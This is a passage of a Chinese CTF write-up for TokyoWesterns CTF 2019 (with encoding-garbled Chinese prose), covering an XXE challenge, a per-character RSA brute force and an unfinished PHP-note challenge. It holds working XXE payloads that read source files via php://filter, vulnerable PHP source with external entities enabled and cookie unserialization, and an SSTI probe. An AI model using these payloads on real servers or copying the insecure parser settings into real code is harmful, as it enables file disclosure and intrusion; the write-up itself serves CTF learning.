xml</code>ï¼Œç„¶åå°±åœ¨æƒ³æ˜¯ä¸æ˜¯æ€è·¯é”™äº†ï¼Œæ²¡æƒ³åˆ°æ˜¯è¯»çš„æ–‡ä»¶ä¸å­˜åœ¨ï¼Œå…¶å®æ‹¿æœ€ç®€å•çš„</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;\n&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY &gt;\n&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;\n&lt;creds&gt;\n&lt;user&gt;&amp;xxe;&lt;/user&gt;\n&lt;pass&gt;mypass&lt;/pass&gt;\n&lt;/creds&gt;</code></pre><p>å°±èƒ½çœ‹å‡ºæ¥å¯ä»¥è§£æï¼Œå› ä¸ºè§‰å¾—ä¸å¯èƒ½è¿™ä¹ˆç®€å•å°±æ²¡æœ‰è¯•â€¦</p>\n<p>è¯»æºç </p>\n<pre><code>&lt;?xml version=&apos;1.0&apos;?&gt;\n&lt;!DOCTYPE mail[\n&lt;!ENTITY hacker SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;\n]&gt;\n\n&lt;mail&gt;\n    &lt;message&gt;&amp;hacker;&lt;/message&gt;\n&lt;/mail&gt;</code></pre><p>è¿™é‡Œæˆ‘ä»¬è¦æ³¨æ„å¾—åˆ°çš„åŠ å¯†åçš„æ•°æ®åœ¨å“ªé‡Œç»“æŸ</p>\n<p><img src=\"http://wx3.sinaimg.cn/mw690/006boCb9ly1g6vh6cdqqvj31d60dmwj2.jpg\" alt=\"è¯»æºç \"></p>\n<p>å¾—åˆ°æºç ï¼Œä»ç¬¬ä¸€å¥å¾—åˆ°<strong>flag</strong>çš„ä½ç½®</p>\n<pre><code>&lt;?php\n**include &apos;flag.php&apos;;**\n\n$method = $_SERVER[&apos;REQUEST_METHOD&apos;];\n\nfunction die404($msg) {\n  http_response_code(404);\n  die($msg);\n}\n\nfunction check_type($obj) {\n  if (is_array($obj)) {\n    $key_is_str = function($obj) {\n      foreach($obj as $key=&gt;$val) {\n        if (is_int($key))\n          return false;\n      }\n      return true;\n    };\n\n    if ($key_is_str($obj)) {\n      return &apos;object&apos;;\n    }\n    else {\n      return &apos;array&apos;;\n    }\n  }\n  else {\n    return gettype($obj);\n  }\n}\n\nfunction json2xml($obj) {\n  $res = &apos;&apos;;\n\n  if (is_array($obj)) {\n    foreach($obj as $key =&gt; $val) {\n      switch(check_type($val)) {\n        case &apos;array&apos;:\n          foreach($val as $v) {\n            $res .= &quot;&lt;$key&gt;&quot;;\n            $res .= json2xml($v);\n            $res .= &quot;&lt;/$key&gt;&quot;;\n          }\n          break;\n        default: // object or primitive\n          $res .= &quot;&lt;$key&gt;&quot;;\n          $res .= json2xml($val);\n          $res .= &quot;&lt;/$key&gt;&quot;;\n          break;\n      }\n    }\n  }\n  else {\n    $res = (string)$obj;\n  }\n  return $res;\n}\n\n\nif ($method === &apos;POST&apos;) {\n  $jsonstr = $_POST[&apos;json&apos;];\n  $xmlstr = $_POST[&apos;xml&apos;];\n\n  if (!(empty($xmlstr) ^ empty($jsonstr))) {\n    die404(&apos;404&apos;);\n  }\n\n  if (!empty($jsonstr)) {\n    $obj = json_decode($jsonstr, true);\n    if (empty($obj)) {\n      die(&apos;failed to decode json&apos;);\n    }\n    $doc = new DOMDocument(&apos;1.0&apos;);\n    $doc-&gt;formatOutput = true;\n    $_obj = array();\n    $_obj[&apos;root&apos;] = $obj;\n    $doc-&gt;loadXML(json2xml($_obj));\n    echo $doc-&gt;saveXML();\n  }\n\n  if (!empty($xmlstr)) {\n    libxml_disable_entity_loader(false);\n    $obj = simplexml_load_string($xmlstr, &apos;SimpleXMLElement&apos;, LIBXML_NOENT);\n    if (empty($obj)) {\n      die(&apos;failed to decode xml&apos;);\n    }\n    echo json_encode($obj, JSON_PRETTY_PRINT);\n  }\n}\nelse {\n?&gt;\n&lt;!doctype html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;JSON &lt;-&gt; XML Converter&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;textarea id=&quot;json&quot; name=&quot;json&quot; rows=&quot;50&quot; cols=&quot;80&quot;&gt;\n    &lt;/textarea&gt;\n\n    &lt;input type=&quot;button&quot; id=&quot;x2j&quot; value=&quot;&lt;-&quot;/&gt;\n    &lt;input type=&quot;button&quot; id=&quot;j2x&quot; value=&quot;-&gt;&quot;/&gt;\n\n    &lt;textarea id=&quot;xml&quot; name=&quot;xml&quot; rows=&quot;50&quot; cols=&quot;80&quot;&gt;\n    &lt;/textarea&gt;\n\n    &lt;script\n      src=&quot;https://code.jquery.com/jquery-3.2.1.min.js&quot;\n      integrity=&quot;sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=&quot;\n      crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;\n    &lt;script&gt;\n      $.get(&apos;/sample.json&apos;, function(data) {\n        $(&apos;#json&apos;).val(data);\n      }, &apos;text&apos;);\n\n      $(&apos;#j2x&apos;).on(&apos;click&apos;, function() {\n        $.post(&apos;/&apos;, {\n          json: $(&apos;#json&apos;).val()\n        }, function(data) {\n          $(&apos;#xml&apos;).val(data);\n        });\n      });\n\n      $(&apos;#x2j&apos;).on(&apos;click&apos;, function() {\n        $.post(&apos;/&apos;, {\n          xml: $(&apos;#xml&apos;).val()\n        }, function(data) {\n          $(&apos;#json&apos;).val(data);\n        });\n      });\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;</code></pre><p>è¯»flag</p>\n<pre><code>&lt;?xml version=&apos;1.0&apos;?&gt;\n&lt;!DOCTYPE mail[\n&lt;!ENTITY hacker SYSTEM &quot;php://filter/convert.base64-encode/resource=flag.php&quot;&gt;\n]&gt;\n\n&lt;mail&gt;\n    &lt;message&gt;&amp;hacker;&lt;/message&gt;\n&lt;/mail&gt;</code></pre><p>è§£å¯†å³å¯<br>    {<br>        â€œmessageâ€: â€œPD9waHAKJGZsYWcgPSAnVFdDVEZ7dDFueV9YWEVfc3QxbGxfZXgxc3RzX2V2ZXJ5d2hlcmV9JzsKâ€<br>    }</p>\n<pre><code>$flag = &apos;TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}&apos;;</code></pre><h2 id=\"real-baby-rsa\"><a href=\"#real-baby-rsa\" class=\"headerlink\" title=\"real-baby-rsa\"></a>real-baby-rsa</h2><p>å‘Šè¯‰äº†æˆ‘ä»¬N,eä»¥åŠæ‰€æœ‰åŠ å¯†åçš„å¯†æ–‡ï¼Œç›´æ¥çˆ†ç ´ã€‚(åšçš„æ—¶å€™åˆæ˜¯é‚£æ ·æƒ³çš„ï¼šæ€ä¹ˆå¯èƒ½è¿™ä¹ˆç®€å•ï¼(è¿™ä¹ˆç®€å•å¼€å§‹çš„æ—¶å€™è¿˜ä¸çŸ¥é“æ›¿æ¢æ‰æ¢è¡Œç¬¦ï¼Œæäº†åŠå¤©æ²¡åšæˆğŸ˜”(ï¼›â€²âŒ’`)))</p>\n<pre><code>#flag = &apos;TWCTF{CENSORED}&apos;\n#print(flag)\n# Public Parameters\nN = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091\ne = 65537\n\n\n# Encrypt the flag!\n\n#for i in flag1:\nfor char in flag:\n    print(pow(ord(char), e, N))</code></pre><p>è§£å¯†è„šæœ¬ï¼š</p>\n<pre><code>import string\n#flag = &apos;TWCTF{CENSORED}&apos;\n\nflag = string.letters+string.digits+&quot;!@#$%^&amp;*()/{}_&quot;\n#print(flag)\n# Public Parameters\nN = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091\ne = 65537\n\ncontent = open(&quot;output&quot;).readlines()\n\nfor line in content:\n    line = line.replace(&apos;\\n&apos;, &apos;&apos;)\n    for char in flag:\n        #print char\n        #print(pow(ord(char), e, N))\n        m = pow(ord(char), e, N)\n        #print(m)\n        #print(line)\n        if str(m) == str(line):\n            #print(m)\n            print(char),\n            break</code></pre><p>å†è´´ä¸€ä¸ªå›½å¤–å¸ˆå‚…å†™çš„ï¼Œçœ‹èµ·æ¥å°±æ˜¯æ¯”ä¸Šé¢çš„ä¼˜é›…ä¸€ç‚¹ğŸ˜€ï¼Œåˆ«é—®ä¸ºä»€ä¹ˆè´´ä¸¤ä¸ªï¼Ÿé—®å°±æ˜¯å–œæ¬¢æ”¶é›†ï¼</p>\n<pre><code>N = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091\ne = 65537\n\n#create ist ascii char\nlist_ascii = []\nfor i in range(33,126):\n    list_ascii.append(chr(i))\n\n#read each part of cipher text in to list\nlineList = list()\nlineList = [line.rstrip(&apos;\\n&apos;) for line in open(&quot;output&quot;)]\n\n#starting burte force\n\nmesg = &quot;&quot;\n\nfor cir in range(0,len(lineList)):\n    for m in list_ascii:\n        test_str = pow(ord(m),e,N)\n        test_str = str(test_str)\n        if(lineList[cir] in test_str):\n            mesg += m\n            break\nprint(mesg)</code></pre><h2 id=\"php-note\"><a href=\"#php-note\" class=\"headerlink\" title=\"php-note\"></a>php-note</h2><pre><code>first name :1\nlastname: {{2*2}}</code></pre><p><img src=\"http://wx3.sinaimg.cn/mw690/006boCb9ly1g6vh6ett6fj30pe0d1wep.jpg\" alt=\"ç™»é™†æˆåŠŸ\"></p>\n<p>æŸ¥çœ‹æºç å¾—åˆ°hint:<code>http://phpnote.chal.ctf.westerns.tokyo/?action=source</code></p>\n<p>è¯»æºç </p>\n<pre><code> &lt;?php\ninclude &apos;config.php&apos;;\n\nclass Note {\n    public function __construct($admin) {\n        $this-&gt;notes = array();\n        $this-&gt;isadmin = $admin;\n    }\n\n    public function addnote($title, $body) {\n        array_push($this-&gt;notes, [$title, $body]);\n    }\n\n    public function getnotes() {\n        return $this-&gt;notes;\n    }\n\n    public function getflag() {\n        if ($this-&gt;isadmin === true) {\n            echo FLAG;\n        }\n    }\n}\n\nfunction verify($data, $hmac) {\n    $secret = $_SESSION[&apos;secret&apos;];\n    if (empty($secret)) return false;\n    return hash_equals(hash_hmac(&apos;sha256&apos;, $data, $secret), $hmac);\n}\n\nfunction hmac($data) {\n    $secret = $_SESSION[&apos;secret&apos;];\n    if (empty($data) || empty($secret)) return false;\n    return hash_hmac(&apos;sha256&apos;, $data, $secret);\n}\n\nfunction gen_secret($seed) {\n    return md5(SALT . $seed . PEPPER);\n}\n\nfunction is_login() {\n    return !empty($_SESSION[&apos;secret&apos;]);\n}\n\nfunction redirect($action) {\n    header(&quot;Location: /?action=$action&quot;);\n    exit();\n}\n\n$method = $_SERVER[&apos;REQUEST_METHOD&apos;];\n$action = $_GET[&apos;action&apos;];\n\nif (!in_array($action, [&apos;index&apos;, &apos;login&apos;, &apos;logout&apos;, &apos;post&apos;, &apos;source&apos;, &apos;getflag&apos;])) {\n    redirect(&apos;index&apos;);\n}\n\nif ($action === &apos;source&apos;) {\n    highlight_file(__FILE__);\n    exit();\n}\n\n\nsession_start();\n\nif (is_login()) {\n    $realname = $_SESSION[&apos;realname&apos;];\n    $nickname = $_SESSION[&apos;nickname&apos;];\n\n    $note = verify($_COOKIE[&apos;note&apos;], $_COOKIE[&apos;hmac&apos;])\n            ? unserialize(base64_decode($_COOKIE[&apos;note&apos;]))\n            : new Note(false);\n}\n\nif ($action === &apos;login&apos;) {\n    if ($method === &apos;POST&apos;) {\n        $nickname = (string)$_POST[&apos;nickname&apos;];\n        $realname = (string)$_POST[&apos;realname&apos;];\n\n        if (empty($realname) || strlen($realname) &lt; 8) {\n            die(&apos;invalid name&apos;);\n        }\n\n        $_SESSION[&apos;realname&apos;] = $realname;\n        if (!empty($nickname)) {\n            $_SESSION[&apos;nickname&apos;] = $nickname;\n        }\n        $_SESSION[&apos;secret&apos;] = gen_secret($nickname);\n    }\n    redirect(&apos;index&apos;);\n}\n\nif ($action === &apos;logout&apos;) {\n    session_destroy();\n    redirect(&apos;index&apos;);\n}\n\nif ($action === &apos;post&apos;) {\n    if ($method === &apos;POST&apos;) {\n        $title = (string)$_POST[&apos;title&apos;];\n        $body = (string)$_POST[&apos;body&apos;];\n        $note-&gt;addnote($title, $body);\n        $data = base64_encode(serialize($note));\n        setcookie(&apos;note&apos;, (string)$data);\n        setcookie(&apos;hmac&apos;, (string)hmac($data));\n    }\n    redirect(&apos;index&apos;);\n}\n\nif ($action === &apos;getflag&apos;) {\n    $note-&gt;getflag();\n}\n\n?&gt;\n&lt;!doctype html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;title&gt;PHP note&lt;/title&gt;\n    &lt;/head&gt;\n    &lt;style&gt;\n        textarea {\n            resize: none;\n            width: 300px;\n            height: 200px;\n        }\n    &lt;/style&gt;\n    &lt;body&gt;\n        &lt;?php\n        if (!is_login()) {\n            $realname = htmlspecialchars($realname);\n            $nickname = htmlspecialchars($nickname);\n        ?&gt;\n        &lt;form action=&quot;/?action=login&quot; method=&quot;post&quot; id=&quot;login&quot;&gt;\n            &lt;input type=&quot;text&quot; id=&quot;firstname&quot; placeholder=&quot;First Name&quot;&gt;\n            &lt;input type=&quot;text&quot; id=&quot;lastname&quot; placeholder=&quot;Last Name&quot;&gt;\n            &lt;input type=&quot;text&quot; name=&quot;nickname&quot; id=&quot;nickname&quot; placeholder=&quot;nickname&quot;&gt;\n            &lt;input type=&quot;hidden&quot; name=&quot;realname&quot; id=&quot;realname&quot;&gt;\n            &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;\n        &lt;/form&gt;\n        &lt;?php\n        } else {\n        ?&gt;\n        &lt;h1&gt;Welcome, &lt;?=$realname?&gt;&lt;?= !empty($nickname) ? &quot; ($nickname)&quot; : &quot;&quot; ?&gt;&lt;/h1&gt;\n        &lt;a href=&quot;/?action=logout&quot;&gt;logout&lt;/a&gt;\n        &lt;!-- &lt;a href=&quot;/?action=source&quot;&gt;source&lt;/a&gt; --&gt;\n        &lt;br/&gt;\n        &lt;br/&gt;\n        &lt;?php\n            foreach($note-&gt;getnotes() as $k =&gt; $v) {\n                list($title, $body) = $v;\n                $title = htmlspecialchars($title);\n                $body = htmlspecialchars($body);\n        ?&gt;\n        &lt;h2&gt;&lt;?=$title?&gt;&lt;/h2&gt;\n        &lt;p&gt;&lt;?=$body?&gt;&lt;/p&gt;\n        &lt;?php\n            }\n        ?&gt;\n        &lt;form action=&quot;/?action=post&quot; method=&quot;post&quot;&gt;\n            &lt;input type=&quot;text&quot; name=&quot;title&quot; placeholder=&quot;title&quot;&gt;\n            &lt;br&gt;\n            &lt;textarea name=&quot;body&quot; placeholder=&quot;body&quot;&gt;&lt;/textarea&gt;\n            &lt;button type=&quot;submit&quot;&gt;Post&lt;/button&gt;\n        &lt;/form&gt;\n        &lt;?php\n        }\n        ?&gt;\n        &lt;?php\n        ?&gt;\n        &lt;script&gt;\n            document.querySelector(&quot;form#login&quot;).addEventListener(&apos;submit&apos;, (e) =&gt; {\n                const nickname = document.querySelector(&quot;input#nickname&quot;)\n                const firstname = document.querySelector(&quot;input#firstname&quot;)\n                const lastname = document.querySelector(&quot;input#lastname&quot;)\n                document.querySelector(&quot;input#realname&quot;).value = `${firstname.value} ${lastname.value}`\n                if (nickname.value.length == 0 &amp;&amp; firstname.value.length &gt; 0 &amp;&amp; lastname.value.length &gt; 0) {\n                    nickname.value = firstname.value.toLowerCase()[0] + lastname.value.toLowerCase()\n                }\n            })\n        &lt;/script&gt;\n    &lt;/body&gt;\n&lt;/html&gt; </code></pre><p>æ²¡åšå®Œï¼Œå…ˆç•™å‘</p>\n","text":"TokyoWestern 20199/5/2019 5:20:26 PM ğŸ¨ji2xji2æ‹¿åˆ°é¢˜ç›®ç¬¬ä¸€ååº”å°±æ˜¯XXEï¼Œç›´æ¥æ‹¿ç€ä¹‹å‰åšå®¢çš„payloadä¸€é¡¿è¯•ï¼Œç»“æœå¾—åˆ°äº†failed to decode xmlï¼Œç„¶åå°±åœ¨æƒ³æ˜¯ä¸æ˜¯æ€è·¯é”™äº†ï¼Œæ²¡æƒ³åˆ°æ˜¯è¯»çš„æ–‡ä»¶ä¸å­˜åœ¨ï¼Œå…¶å®æ‹¿æœ€ç®€å•çš„&l","link":"","raw":null,"photos":[],"categories":[{"name":"WP","slug":"WP","count":7,"path":"api/categories/WP.json"}],"tags":[{"name":"SSTI","slug":"SSTI","count":2,"path":"api/tags/SSTI.json"},{"name":"RSA","slug":"RSA","count":4,"path":"api/tags/RSA.json"}]}]}